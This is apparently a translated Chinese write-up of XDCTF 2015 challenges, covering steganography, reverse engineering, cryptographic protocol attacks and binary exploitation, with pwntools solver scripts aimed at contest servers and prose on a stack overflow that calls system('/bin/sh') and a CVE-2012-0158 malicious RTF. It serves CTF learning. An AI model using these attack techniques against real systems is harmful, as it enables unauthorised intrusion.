# XDCTF2015 WriteUp

阅读量 **212037**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2015-10-06 11:45:39

 **x**

##### 译文声明

本文是翻译文章，文章来源：复旦六星战队@360安全播报

译文仅供参考，具体内容表达以及含义原文为准。

**MISC 100**

给出了一张官网logo一模一样的图片,一开始完全摸不着头脑。后来给出了原图,但是俩文件大小差了不少,应该不是简单的修改。然后给出了brain的提示,其实想到了跟brainfuck有关,但是我对brainfuck的理解也就是一个比较奇怪的编程语言,没有深入搜索。再然后说braintools了,我估摸着也是用了什么现成的图片隐写工具,直接GOOGLE或者github搜,找到braintool然后用命令解出来即可。

如此得到了brainfuck代码,然后用BFI工具跑一下就可以得到结果。

**  
**

**MISC 300**

上来肯定先例行检查下LSB啦

    
    
    python
    >>> import Image
    >>> a=Image.open('zxczxc.png')
    >>> a.point(lambda i: 255 if i&1 else 0).show()

可以发现第一列有藏着东西,仔细看看像素值

    
    
    python
    >>> for i in xrange(100):
    ...     print a.getpixel((0,i))
    ...
    (252, 255, 254)
    (253, 252, 255)
    (254, 252, 252)
    (254, 253, 254)
    (252, 255, 253)
    (252, 253, 254)
    (253, 254, 252)
    (254, 252, 255)
    (253, 255, 253)
    (252, 253, 254)
    (254, 253, 252)
    (254, 253, 253)
    (253, 254, 253)
    (252, 253, 254)
    (252, 255, 252)
    ...

发现其在252~255之间,那就是用了最后两位藏数据

最后试了下是按像素顺序、RGB顺序、倒数第二第一位的顺序排列的01串

    
    
    python
    >>> s=''
    >>> for i in xrange(165):
    ...     p=a.getpixel((0,i))
    ...     for k in xrange(3):
    ...             s+='1' if p[k]&2 else '0'
    ...             s+='1' if p[k]&1 else '0'
    ...
    >>> s
    '001110010011100000100110001101000110011000100011011101000110100100100101011001000110001100110010001100010011000000101110001100100011011100101110001100010011000000101110001100010011100100110101001011010011001000110000001100010011010100101101001100000011100100101101001100010011011001010100001100000011010100111010001100100011000100111010001101010011001000101011001100000011001000111010001100000011000000111001001110000010011000110100011001100010001101110100011010010010010101100100011000110111100011011010101010110100100001001001001011100100100110101011001011100010111000110001010011100100111111001100001100110100100000101111001100100010100111001000101010001101010001001101110011010100101100110110010010000011000111010110001101010011011110101110001010001101000100110101110011000010101111001001110101110011010111001100001101010100100101001111101011010000010100000000010110100111000000001111000101110011100100111000001001100011010001100110001000110111010001101001001001010110010001100011111111'
    >>> def tostr(s):
    ...     ret=''
    ...     for i in xrange(0, len(s), 8):
    ...             ret+=chr(int(s[i:i+8],2))
    ...     return ret
    ...
    >>> tostr(s)
    '98&4f#ti%dc210.27.10.195-2015-09-16T05:21:52+02:0098&4f#ti%dcxxdaxabHI.Ixab..1NOxcc3H/2)xc8xa8xd4MxcdK6H1xd657xae(xd15xcc+xc9xd75xcc5IOxadx05x00Zpx0fx1798&4f#ti%dc?'
    >>>

可以看到210.27.10.195-2015-09-16T05:21:52+02:00以及分隔符样的东西98&4f#ti%dc

一开始还以为那个IP 210.27.10.195有什么东西…

然后队友说这是zlib compressed才注意到第二个分隔符后有xxda这个头…..

    
    
    python
    >>> import zlib
    >>> zlib.decompress('xxdaxabHI.Ixab..1NOxcc3H/2)xc8xa8xd4MxcdK6H1xd657xae(xd15xcc+xc9xd75xcc5IOxadx05x00Zpx0fx1798&4f#ti%dc')
    'xdctf{st3gan0gr4phy-enc0d3-73xt-1nto-1m4ge}'

得到Flag

  

**REVERSE 100**

做题人在赶火车,留下程序就跑了……

这题好像比较坑的是,以为不会运行到的一段程序才是真的逻辑,一直被关注的地方过掉的话拿到的那个 congratulations 后面跟着 `?`

    
    
    python
    strs = '\|Gq\@?BelTtK5L`\|D`d42;'
    tmp = ''
    for c in strs:
    tmp+=chr(ord(c)^6)
    strs=tmp
    def check2(a):
    ans = {}
    for i in range(24):
    key = i - 12 * (((0x0AAAAAAAAAAAAAAAB * i) >> 64) >> 3)
    value = a[i] ^ ord(strs[i])
    if (key in ans):
    if ans[key]!=value:
    return
    else:
    ans[key]=value
    s = ''
    for c in ans:
    s += chr(ans[c])
    print s
    #print ord(s[1])
    def rotate(a):
    for i in range(6):
    t = a[i]
    a[i] = a[17-i]
    a[17-i] = t
    def check(a):
    rotate(a)
    check2(a)
    rotate(a)
    def dfs(a, i):
    if i == len(a):
    check(a)
    return
    dfs(a,i+1)
    if a[i]>31 and a[i]<64:
    a[i]-=32
    dfs(a,i+1)
    a[i]+=32
    s = ';%#848N!0Z?7x27%23]/5#1"YX'
    print 'len(s): %d' % len(s)
    print 's:' + s
    a = []
    for c in s:
    a.append(ord(c))
    dfs(a,0)

**REVERSE 200**

exe文件,首先找到那几个You shall not
pass的位置简单patch下把反调试去掉(为了区分顺便把每个字符串的第一个字符改了),然后动态单步跟,最后发现在401040及下面的一堆都是对输入的检查,长得跟静态时不太一样估计修改过。记得先检查了XDCTF{和最后的},因为后面那个大括号的关系长度也就出来了,然后检查了两个单词分隔符,用两次call检查了被分隔符隔开的前两个单词,最后再检查末尾4位。因为都是简单的运算,在cmp那里逆推一下就行了。

  

**REVERSE 300**

**尝试**

原源代码:

    
    
    python
    (lambda __g, __y: [[[[[[[(fin.close(), [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [(ss.append(c), (sss.append(0), __this())[1])[1] for __g['c'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(s), lambda: [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [(lambda __value: [__this() for __g['sssss'] in [((lambda __ret: __g['sssss'] + __value if __ret is NotImplemented else __ret)(getattr(__g['sssss'], '__iadd__', lambda other: NotImplemented)(__value)))]][0])(chr(c)) for __g['c'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(ssss), lambda: [(fout.write(sssss), (fout.close(), None)[1])[1] for __g['fout'] in [(open('flag.enc', 'wb+'))]][0], []) for __g['sssss'] in [('')]][0] for __g['ssss'] in [(encode(ss, sss))]][0], []) for __g['sss'] in [([])]][0] for __g['ss'] in [([])]][0])[1] for __g['s'] in [(fin.read().strip())]][0] for __g['fin'] in [(open('flag.txt', 'r'))]][0] for __g['encode'], encode.__name__ in [(lambda data, buf: (lambda __l: [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [[__this() for __l['data'][__l['i']] in [((table.index(__l['data'][__l['i']]) + 1))]][0] for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange(__l['_len'])), lambda: (lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [[[__this() for __l['buf'] in [(setbit(__l['buf'], __l['i'], getbit(__l['data'], __l['j'])))]][0] for __l['j'] in [((((__l['i'] / 6) * 8) + (__l['i'] % 6)))]][0] for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange((__l['_len'] * 6))), lambda: __l['buf'], []), []) for __l['_len'] in [(len(__l['data']))]][0] for __l['data'], __l['buf'] in [(data, buf)]][0])({}), 'encode')]][0] for __g['getbit'], getbit.__name__ in [(lambda p, pos: (lambda __l: [[[((__l['p'][__l['cpos']] >> __l['bpos']) & 1) for __l['bpos'] in [((__l['pos'] % 8))]][0] for __l['cpos'] in [((__l['pos'] / 8))]][0] for __l['p'], __l['pos'] in [(p, pos)]][0])({}), 'getbit')]][0] for __g['setbit'], setbit.__name__ in [(lambda p, pos, value: (lambda __l: [[[(lambda __target, __slice, __value: [(lambda __target, __slice, __value: [__l['p'] for __target[__slice] in [((lambda __old: (lambda __ret: __old | __value if __ret is NotImplemented else __ret)(getattr(__old, '__ior__', lambda other: NotImplemented)(__value)))(__target[__slice]))]][0])(__l['p'], __l['cpos'], (__l['value'] << __l['bpos'])) for __target[__slice] in [((lambda __old: (lambda __ret: __old & __value if __ret is NotImplemented else __ret)(getattr(__old, '__iand__', lambda other: NotImplemented)(__value)))(__target[__slice]))]][0])(__l['p'], __l['cpos'], (~(1 << __l['bpos']))) for __l['bpos'] in [((__l['pos'] % 8))]][0] for __l['cpos'] in [((__l['pos'] / 8))]][0] for __l['p'], __l['pos'], __l['value'] in [(p, pos, value)]][0])({}), 'setbit')]][0] for __g['table'] in [(string.printable.strip())]][0] for __g['string'] in [(__import__('string', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))

一大堆lambda…嗯,其实这题还是很简单的…

在本地尝试执行,并查看globals(),得

    
    
    python
    Traceback (most recent call last):
      File "<stdin>", line 1, in <module>
      File "<stdin>", line 1, in <lambda>
    IOError: [Errno 2] No such file or directory: 'flag.txt'
    >>> globals()
    {'string': <module 'string' from 'D:Python27libstring.pyc'>, '__builtins__': <module '__builtin__' (built-in)>, '__package__': None, 'i': 654, 'table': '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~', 'encode': <function encode at 0x02836C30>, '__name__': '__main__', 'getbit': <function getbit at 0x028364B0>, '__doc__': None, 'setbit': <function setbit at 0x02815E30>}

也就是import string,并生成了encode(), getbit(), setbit()的函数,还有一个table

下面还是先介绍下背景知识吧….

**函数式编程与lambda运算**

这个程序跟函数式编程还是有一定关系的,当然不会也能做…

下面就是这个.py的主要trick

**等量代换(实现where语句,scope内赋值)**

不妨先看下这样的例子:

    
    
    [y for y in [1]] == [1]

再看个复杂点的

    
    
    python
    [x for x in [range(3)]] == [x for x in [[0, 1, 2]]] == [ [0,1,2] ]

如果把最外层的方括号看成一个scope,也就是如同C语言里的{}所起的作用一样,那么这句话就是一个等量代换,把这句话变形一下易于理解,即:

    
    
    [
    x
    for x in [range(3)]
    ]

去掉in,得

    
    
    [
    x
    for x = range(3)
    ]

把最外层[]理解成c语言的scope

    
    
    {
    x = range(3)
    返回 x
    }

求值得

    
    
    {
    [0, 1, 2]
    }

把scope变回来,即得`[ [0,1,2] ]`

换句话,我们得到两个等量代换式:

    
    
    [blahblah(x) for x in [y] ] == [blahblah(x) where x = y]
    [blahblah(x) for x in [[y]][0] ] == [blahblah(x) where x = y]

这样相当于haskell的where语句

也就是说,可以用这种形式实现在scope内的赋值操作,在scope内把x赋值为y

比如说,要想得到`[(0, 0)]`我们可以这样写:

    
    
    [(x, y) for x in [0] for y in [[0]][0]] == [(0, 0)]

**lambda calculus beta规约(实现let语句)  
**

以下是lambda calculus的beta规约定理的例子:

    
    
    python
    (lambda j: j*2)(3) == (3*2) == 6

如果把lambda运算内部视为一个scope,那么就相当于

    
    
    lambda:
    let j = 3:
    return j*2

**开始逆向**

trick讲完了,就可以粗粗整理下代码了,加些赋值符号:

    
    
    python
    (lambda __g, __y: [[[[[[[(fin.close(), [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda:
    (lambda __i: [(ss.append(c), (sss.append(0), __this())[1])[1]
    for __g['c'] in [(__i)]][0] if __i is not __sentinel else __after())
    (next(__items, __sentinel)))())(iter(s), lambda: [[(lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [(lambda __value: [__this() for __g['sssss'] in [((lambda __ret: __g['sssss'] + __value if __ret is NotImplemented else __ret)(getattr(__g['sssss'], '__iadd__', lambda other: NotImplemented)(__value)))]][0])(chr(c)) for __g['c'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(ssss), lambda: [(fout.write(sssss), (fout.close(), None)[1])[1] for __g['fout'] in [(open('flag.enc', 'wb+'))]][0], [])
    for __g['sssss'] in [('')]][0]
    for __g['ssss'] in [(encode(ss, sss))]][0], [])
    for __g['sss'] in [([])]][0]
    for __g['ss'] in [([])]
    ][0])[1]
    for __g['s'] in [(fin.read().strip())]][0]
    for __g['fin'] in [(open('flag.txt', 'r'))]][0]
    for __g['encode'], encode.__name__ in [
    (lambda data, buf:
      (lambda __items, __after, __sentinel:
        __y(lambda __this: lambda:
          (lambda __i:
            [data['i'] = ((table.index(data['i']) + 1))
            if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange(__l['_len'])),
            lambda: (lambda __items, __after, __sentinel:
              __y(lambda __this: lambda: (lambda __i: [[[
              __this() for __l['buf'] in [(
                 j=(i / 6) * 8 + (i % 6)
                 setbit(buf, i, getbit(data, j))
                  if __i is not __sentinel else __after())(next(__items, __sentinel)))())
            (iter(xrange((__l['_len'] * 6))), lambda: __l['buf'], []), []) for __l['_len'] in [(len(__l['data']))] )
    ]][0]
    for __g['getbit'], getbit.__name__ in [(lambda p, pos: (lambda __l: [[[((__l['p'][__l['cpos']] >> __l['bpos']) & 1) for __l['bpos'] in [((__l['pos'] % 8))]][0] for __l['cpos'] in [((__l['pos'] / 8))]][0] for __l['p'], __l['pos'] in [(p, pos)]][0])({}), 'getbit')]][0]
     for __g['setbit'], setbit.__name__ in [(lambda p, pos, value: (lambda __l: [[[(lambda __target, __slice, __value: [(lambda __target, __slice, __value: [__l['p'] for __target[__slice] in [((lambda __old: (lambda __ret: __old | __value if __ret is NotImplemented else __ret)(getattr(__old, '__ior__', lambda other: NotImplemented)(__value)))(__target[__slice]))]][0])(__l['p'], __l['cpos'], (__l['value'] << __l['bpos'])) for __target[__slice] in [((lambda __old: (lambda __ret: __old & __value if __ret is NotImplemented else __ret)(getattr(__old, '__iand__', lambda other: NotImplemented)(__value)))(__target[__slice]))]][0])(__l['p'], __l['cpos'], (~(1 << __l['bpos']))) for __l['bpos'] in [((__l['pos'] % 8))]][0] for __l['cpos'] in [((__l['pos'] / 8))]][0] for __l['p'], __l['pos'], __l['value'] in [(p, pos, value)]][0])({}), 'setbit')]][0]
     for __g['table'] in [(string.printable.strip())]][0] for __g['string'] in [(__import__('string', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))

核心部分我又整理了一次:

    
    
    python
    [(fout.write(sssss), (fout.close(), None)[1])[1] for __g['fout'] in [(open('flag.enc', 'wb+'))]][0], []) for __g['sssss'] in [('')]][0] for __g['ssss'] in [(encode(ss, sss))]][0], []) for __g['sss'] in [([])]][0] for __g['ss'] in [([])]][0])[1] for __g['s'] in [(fin.read().strip())]][0] for __g['fin'] in [(open('flag.txt', 'r'))]][0] for __g['encode'], encode.__name__ in [
    (lambda data, buf: (lambda __l: [[
      (lambda __items, __after, __sentinel: __y(
        lambda __this: lambda:
          (lambda __i: [[__this() for __l['data'][__l['i']] in [((table.index(__l['data'][__l['i']]) + 1))]][0] for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange(__l['_len'])), lambda: (lambda __items, __after, __sentinel: __y(lambda __this: lambda: (lambda __i: [[[__this()
            for __l['buf'] in [(
              setbit(__l['buf'], __l['i'], getbit(__l['data'], __l['j'])))]][0]
                for __l['j'] in [((((__l['i'] / 6) * 8) + (__l['i'] % 6)))]][0]
                for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(iter(xrange((__l['_len'] * 6))), lambda: __l['buf'], []), []) for __l['_len'] in [(len(__l['data']))]][0]
                for __l['data'], __l['buf'] in [(data, buf)]][0])({}), 'encode')]][0]

仔细看看,核心部分也就几句话:

    
    
    python
    [data['i'] = ((table.index(data['i']) + 1))
    __this() for __l['buf'] in [(
                 j=(i / 6) * 8 + (i % 6)
                 setbit(buf, i, getbit(data, j))
                  if __i is not __sentinel else __after())(next(__items, __sentinel)))())
            (iter(xrange((__l['_len'] * 6)))
     for __g['table'] in [(string.printable.strip())]][0] for __g['string'] in [(__import__('string', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))

其中`__g[xxxxx]`就是全局变量,`__l[xxx]`就是局部变量

那么加密方式就出来了,把原字符在table的index+1后,把后6位保存到文件里

(其实这里由于我懒得看setbit,getbit所以搞反了字节序,

后来把aaaaaaaaaaaa写入flag.txt用这个程序加密后仔细逐位对比后才发现- -||)

由于`6*4==3*8`,我就每3字节一起decode

decode3b函数:

    
    
    python
    def tobin(b):
    ret=''
    for i in [128,64,32,16,8,4,2,1]:
    ret+='1' if b&i else '0'
    return ret
    def decode3b(s):
        a=s>>16
        b=(s>>8) & 0xFF
        c=s & 0xff
        sa=tobin(a)
        sb=tobin(b)
        sc=tobin(c)
        return table[int(sa[2:],2)]+table[int(sb[4:]+sa[:2],2)]+table[int(sc[6:]+sb[:4],2)]+table[int(sc[:6],2)]
    >>> a=open('flag.enc','rb')
    >>> a=a.read()
    >>> s=''
    >>> for i in xrange(0, len(a), 3):
    ...     s+=decode3b(int(a[i:i+3].encode('hex'), 16))
    ...
    >>> s
    'yedugr1ofbm2o4epQz8i1op2tpkxft1nf344t000000000000000'
    >>> s=''.join(map(lambda c: table[(table.index(c)+63)%64], s))
    'xdctfq0neal1n3doPy7h0no1sojwes0me233s"""""""""""""""'

由于只保留了最后6位,所以在table里的index大于64的特殊字符是没有的,要手动(脑)补上第7位,

查table+64可知`'q'->'{', 'o'->'_'`等等….

得:

    
    
    xdctf{0ne-l1n3d_Py7h0n_1s_@wes0me233}

****

**REVERSE 500**

注册机程序,给定机器码要求key,在string里可以发现openssl之类字样。

这题前半部分是队友看的,发现程序动态hook了GetDlgTextA,在其中首先检查位数是否48位,然后只包含0-9,A-F,接着进行hex解码后,扔到某个函数里处理后,前32位与机器码比较,后16位均为08(其实前部分是机器码移动2位再与0xe4异或后再比较的,还用了xmm0,不过那都是细节)。

关键就是前面的“某个函数”了,多试几次发现输入输出以64bit为一个块单位,结合字符串“libdes…”“解密之前”猜测该函数对输入使用des进行了解密,然后尝试找可疑的des
key,试了好几处发现函数开头的赋值有点奇怪,验证发现des key就是e1723b0b73f4c641,要记得大小端转换。

des操作采用pycrypto库,代码段如下:

c是用key和mode_ecb初始化后的des

    
    
    python
    >>> ss='F89AE772A6F990306EB0E82448435BFF'
    >>> t=ss.decode('hex')
    >>> t1=''
    >>> for ch in t:
    ...     t1+=chr(ord(ch)^0xe4)
    ...
    >>> t1
    'x1c~x03x96Bx1dtxd4x8aTx0cxc0xacxa7xbfx1b'
    >>> t1.encode('hex')
    '1c7e0396421d74d48a540cc0aca7bf1b'
    >>> ss='1c7e0396421d74d48a540cc0aca7bf1b0808080808080808'
    >>> ss=ss.decode('hex')
    >>> c.encrypt(ss).encode('hex')
    '9eea87758a647e5d74a376cd6281cfb5970bb701caf237f3'
    >>> s=c.encrypt(ss).encode('hex')
    >>> s.upper()
    '9EEA87758A647E5D74A376CD6281CFB5970BB701CAF237F3'

**CRYPT 100**

密文一眼看上去全是大写字母,略微数了一下发现少J,看来应该是用了什么奇怪的加密方式,GOOGLE一番,可以找到一个比较古典的加密方式,playfair

个人觉得这加密方法还挺复杂的,抓耳挠腮之后还是继续GOOGLE看看有没有现成的playfair破解工具。结果在stackoverflow或者什么Stackexchange之类的网站上找到了一个好像是个大学课程里面提供的C语言程序,http://www.cs.miami.edu/home/burt/learning/Csc609.051/programs/playn/,运行之后就解出了明文,但是明文还是有很多不准确的字母,稍微人肉看了几句话,再搜发现是I
have a dream的内容,稍微比对比对,发现文末就是FLAG。

  

**CRYPT 200**

首先查看程序,可以发现这题其实就两个操作,mkprof 是将所给字符串加上前后缀后加密,parse
是将所给加密的串解密,只要串中含有一个特定子串(加密的时候不能输入含有这个子串的串)就能拿到 flag。

而这里的加密采取分段的方式,每一段将当前段明文与前一段的密文异或的结果用一个固定的我们不知道的 key 来进行 AES 加密。

那么对于两个串 A 和 B,我们首先拿到 A 的第 n 段和 B 的第 n 段的加密结果(要求两者不一样),然后我们在 B 的第 n+1
段中含有所需特定字符串,由于我们不能直接要求服务器对 B 进行加密,我们可以将 A 的第 n+1 段设为一个特定的字符串,满足此串与 A 的第 n
段加密结果异或的值和 B 的第 n+1 段明文与 B 的第 n 段的加密结果异或的值一样,那么显然此时 A 与 B 第 n+1
段加密出来的结果会是一样的。于是我们将 A 加密得到的第 n+1 段拼在 B 的前 n 段的加密结果后面去解密,就能通过判断,拿到 flag。

## CRYPT 300

这题要求用户指定index和ckey,然后用某些复杂操作计算sha512的hash值,涉及我们不知道的password和某个随机数。

因为题目里存在有限域上的求幂操作,而且N给定,所以可以考虑让求幂结果相对较少,对ckey的检查只要求模N不为0,所以我们可以取1让它计算时不来添麻烦。对index的检查要求它在2-N/2之间,我们希望index的阶尽量小,后来把N-1分解了一下发现有2*2*5*bignum,所以就找了个阶为5的index,这样index不管多少次方最多应该就5个结果,于是其中随便猜一个不停跑就是了。

这题好歹python程序没丢……

    
    
    python
    #encoding = utf-8
    import random,sys,struct
    import base64 as b64
    import os
    import hmac
    from hashlib import sha512,sha1
    from time import time
    from pwn import *
    def hash2int(*params): 
    sha=sha512()
    for el in params:
    sha.update("%r"%el)
    return int(sha.hexdigest(), 16)  
    N = 1501763523645191865825715850305314918471290802252408144539280540647301821
    '''
    def cryptrand(self,n=2048):  
    p1=self.hash2int(os.urandom(40))<<1600  
    p1+=self.hash2int(p1)<<1000
    p1+=self.hash2int(p1)<<500
    p1+=self.hash2int(p1)
    bitmask=((2<<(n+1))-1)
    p1=(p1&bitmask)
    return  (p1% self.N)
    def sendInt(self,toSend):
    s=hex(toSend)
    s=s[2:]
    if s[-1]=="L":
    s=s[:-1]
    self.request.sendall(s+"n")
    def readInt(self):
    req=self.request
    leng = struct.unpack("H", req.recv(2))[0]
    if leng>520:
    req.sendall("Sorry that is too long a numbern")
    req.close()
    return None
    toRead = ""
    while len(toRead) < leng:
    toRead += req.recv(leng - len(toRead))
    if len(toRead) > leng:
    req.sendall("Something wrong!n")
    req.close()
    return None
    return int(toRead,16)
    def checkBlacklist(self):
    foreign=self.request.getpeername()[0]
    if foreign in self.accepted:
    while(len(self.accepted[foreign]) >0 and
    self.accepted[foreign][0]<time()-600):
    del self.accepted[foreign][0]
    if len(self.accepted[foreign])>5:
    self.request.send("Too many requests too quick sorryn")
    self.request.close()
    return False
    else:
    self.accepted[foreign]=[]
    return True
    def getParamsFromClient(self):
    N=self.N
    req=self.request
    index=self.readInt()
    if index is None:
    return
    if index<2 or index>N/2:
        #brute force attempt
    req.sendall("A Wrong move against the motherland!n")
    req.close()
    return None
    req.sendall("Please provide your temporary key, be careful!n")
    ckey=self.readInt()
    if ckey is None:
    return None
    if  ckey%N==0:
    req.sendall("Wrong way to xidiann")
    req.close()
    return None
    return ckey,index
    def doCryptAttack(self,index,ckey,salt):
    N=self.N
    password = ""
    hash2int= self.hash2int
    salt=hash2int(index)
    storedKey = pow(index, hash2int(salt, password), N)
    coefSlush = 3
    skeyPriv = self.cryptrand()
    skey = (coefSlush * storedKey + 
    pow(index, skeyPriv, N)) % N
    self.sendInt(salt)
    print 'salt',salt
    print 'n'
    self.sendInt(skey)
    print 'sKey',skey
    slush = hash2int(ckey, skey)
    tempAgreedKey = hash2int(pow(ckey * pow(storedKey, slush, N), skeyPriv, N))
    return tempAgreedKey,skey
    def handle(self):
    N=self.N
    hash2int=self.hash2int
    req = self.request
    req.sendall("Welcome to 2015 xidian ctf's checkin server, please provide 2 magic numbers!n")
    ckey,index=self.getParamsFromClient()
    print ckey
    print 'n'
    print index
    salt=self.hash2int(index)
    tempAgreedKey,skey=self.doCryptAttack(index,ckey,salt)
    print 'akey',tempAgreedKey
    finalKey=hash2int(hash2int(N) ^ hash2int(index), hash2int(index), salt, 
    ckey, skey, tempAgreedKey)
    print 'genkey',finalKey
    check=self.readInt()
    if(check==finalKey):
    req.sendall("Well done com rade, the flag is XDCTF{xxxxxx} .n")
    req.close()
    '''
    def doSend(num):
    s=hex(num)
    return struct.pack('H',len(s))+s
    if __name__ == "__main__":
    context.log_level='debug'
    #conn = remote("127.0.0.1",5000)
    conn = remote("133.130.52.128",5000)
    conn.recv()
    index=53538541699666989075104314189461622667506313026452523318908741414211402
    prob=[]
    for i in range(5):
    prob.append(hash2int(pow(index,i,N)))
    print prob
    ckey=1
    print doSend(index)
    print hash2int(index)
    conn.send(doSend(index))
    conn.recv()
    conn.send(doSend(ckey))
    r=conn.recv()
    salt=int(r,16)
    r=conn.recv()
    skey=int(r,16)
    slush = hash2int(ckey, skey)
    tempAgreedKey = prob[0]
    finalKey=hash2int(hash2int(N) ^ hash2int(index), hash2int(index), salt, ckey, skey, tempAgreedKey)
    conn.send(doSend(finalKey))
    r=conn.recv()
    if "flag" in r:
    print "-----------------"
    print r
    print "-----------------"
    conn.recv()

**CRYPT 400**

其实我很诧异这题没有其它队过……

首先看py文件知道它调用了某个我们看不到的加密程序,然后发现它以6个字符为一段,因为经过hex编码所以实际没段只有3个byte,而且允许我们发送明文并返回密文,很自然就想到穷举明文与密文比对。虽然key会变动但每次请求都会返回flag的密文所以没什么影响。

首先弄了个string.printable的三重循环,跑了半天发现服务器响应有点慢,会崩,于是就猜flag应该不是随机串,打算先爆出几个块然后开脑洞猜,先是弄了个string.ascii_letters的三重循环,后来又缩小到string.ascii_lowercase,因为最先爆出来的aos和le}两个块里面都只有小写字母(最后一块只要猜两个字母所以最好爆),其实还没跑完队友已经用脑洞把所有块补全了XD。最后只差一个e,w,因为首位字母比较容易确定就把中间那个字符用string.printable爆了下。

当然中途也试过用_作为块中一个字符来爆等等其它手段,最后发现几乎是纯小写啊。

    
    
    python
    from pwn import *
    import string
    import itertools
    context.log_level='debug'
    def doinit(key):
    l=len(key)/6
    for i in range(l):
    keydic[key[i*6:(i+1)*6]]=i
    def getdic(str):
    global keydic
    global key
    conn=remote("159.203.87.2",5678)
    conn.recvline()
    newkey=conn.recvline()
    conn.recvline()
    conn.send(str+'n')
    res=conn.recv()
    res=res.strip()
    newkey=newkey.strip()
    if key=='':
    key=newkey
    doinit(key)
    if key!=newkey:
    key=newkey
    keydic={}
    doinit(key)
    print "key changed"
    l=len(str)/6
    for i in range(l):
    tmpblk=res[i*6:(i+1)*6]
    if keydic.get(tmpblk)!=None:
    ans[keydic[tmpblk]]=str[i*6:(i+1)*6]
    print keydic[tmpblk],ans[keydic[tmpblk]]
    keydic={}
    ans=[]
    for i in range(78/6):
    ans.append('')
    # test
    '''
    dic['101010']='313233'
    dic['111111']='343536'
    decrypt('101010111111101010')
    exit()
    '''
    key=''
    table=string.ascii_lowercase
    sendstr=''
    sendlen=0
    for b0 in table:
    for b1 in table:
    for b2 in table:
    sendstr+=b0.encode('hex')+b1.encode('hex')+b2.encode('hex')
    sendlen+=6
    if sendlen==180:
    getdic(sendstr)
    sendstr=''
    sendlen=0
    print ans
    print ans

**CRYPT 500**

这题是道椭圆曲线,需要预测产生的下一个随机数,首先nistp256这条曲线是固定的,可以搜到相关的参数。通过观察getrand里面的操作,可知产生的随机数是Q*x在x轴上的值,而下一次使用的x是P*这次的x,因为服务器会返回第一次的随机数,Q以及d,P是曲线的基点是固定的,所以可以令返回的随机数所对应的椭圆曲线点在乘上d的逆元得到下一次使用的x,然后顺推得到下一次的随机数(generate_backdoor里甚至都求了逆元,这是提示么)。

然后怎么从x轴的值反推椭圆曲线的点我卡了快一个白天……

最后好像是搜椭圆曲线基点选取的时候找到了现成的算法,特殊情况下的离散对数问题,二次剩余之类虽然听过不过以前不太熟悉啊。

似乎服务器会等的时间比较久,于是懒得写程序直接用python命令行手动搞,以下是部分命令记录:

    
    
    python
    a=0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc
    b=0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b
    p=a+3
    p1=(p+1)/4

curve是曲线

P是基点,不要吐槽跟上面那个p长这么像

    
    
    python
    >>> xi=57914131887997596536669874361124734441741601814101568455763547876867316798523
    >>> t=(xi**3+a*xi+b)
    >>> t1=t%p
    >>> pow(t1,p1,p)
    43331064576091791900838480679880237851600469995188036303750484440002321848367L
    >>> d=9673497928745459324013728553516164787612436752039204660069136338836429731578
    >>> Q=seccure.AffinePoint(3529261633757778563782558685806991416222128376163198390623944234947821868434,1227400874056650306347612046180653179066970966812566313338015124847638720935,curve)
    >>> i0=seccure.AffinePoint(57914131887997596536669874361124734441741601814101568455763547876867316798523,43331064576091791900838480679880237851600469995188036303750484440002321848367,curve)
    >>> e=gmpy.invert(gmpy.mpz(d),curve.order)>>> i1=i0*e
    >>> Q*i1.x
    <AffinePoint (2905397088598526610908372447023102363026764674296260395110813409314612564062, 6813252672640352463766524774630903620705840560787288153888638751744747727230) of secp256r1/nistp256>

  

**PWN 100**

杀软报毒可发现所给文件的CVE-2012-0158的exploit,用office打开所给恶意RTF文件,触发exp运行,动态调试可发现内存中有`C:flag.txt`字符串,于是发现在此路径有隐藏文件存有flag。

好吧,我知道正解应该是去找到对应的shellcode的地方看……

  

**PWN 200**

程序很明显的一个栈溢出,无栈cookie,又是32位,参数可直接控制,但是由于没给libc,无法根据泄漏got表计算system的地址。

但是由于程序可以无限次泄漏,且长度不限,即意味着我们完全有能力dump出整个内存,故而肯定可以直接在内存中找到system的地址,简单起见,可以直接使用pwntools中的DynELF。

由于DynELF只能查找库函数地址,故而,查找`/bin/sh`字符串比较麻烦,于是可以选择通过调用read读入到空闲地址。

比较坑的是,做的时候泄漏system地址后,调用system总是无效,但是调用write确能正常输出,在system下断点发现程序确实执行过去并且参数正确,死命的不知道哪里错了,最后在调用system之前,让程序跳到__start恢复栈重新开始程序就可以成功调用system。

  

**PWN 300**

做题人留下程序赶火车去了 again ……

我就知道他最开始没有 checksec,导致浪费了一天时间……

    
    
    python
    from pwn import *
    #c = process('./aa508d1df74d46a88bc02210c7f92824')
    #c = remote('localhost', port = 6666)
    c=remote('133.130.90.210', port=6666)
    print c.recv()
    def mysend(s):
    global c
    z = c.recv()
    #print s
    c.sendline(s)
    #print s
    sleep(0.2)
    for i in range(5):
    mysend('1')
    mysend('0')
